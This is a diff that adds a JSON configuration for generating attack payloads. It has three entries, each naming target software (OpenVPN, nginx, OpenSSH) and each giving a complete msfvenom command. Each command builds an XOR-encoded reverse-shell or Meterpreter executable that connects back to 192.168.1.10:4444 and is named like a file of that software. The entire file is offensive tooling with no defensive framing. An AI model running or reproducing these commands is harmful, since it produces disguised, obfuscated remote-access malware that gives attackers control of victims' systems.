@@ -1,0 +1,26 @@
+[
+    {
+        "target": "openvpn:openvpn:2.6.3",
+        "arch": "x64",
+        "payload": "windows/x64/meterpreter/reverse_tcp",
+        "encoder": "x64/xor_dynamic",
+        "format": "exe",
+        "msfvenom_command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x64/xor_dynamic -o openvpn_payload.exe"
+    },
+    {
+        "target": "f5:nginx:0.5.6",
+        "arch": "x64",
+        "payload": "linux/x64/meterpreter/reverse_tcp",
+        "encoder": "x64/xor_dynamic",
+        "format": "elf",
+        "msfvenom_command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -e x64/xor_dynamic -o nginx_payload.elf"
+    },
+    {
+        "target": "openbsd:openssh:7.7",
+        "arch": "x64",
+        "payload": "bsd/x64/shell_reverse_tcp",
+        "encoder": "x64/xor_dynamic",
+        "format": "elf",
+        "msfvenom_command": "msfvenom -p bsd/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -e x64/xor_dynamic -o openssh_payload.elf"
+    }
+]
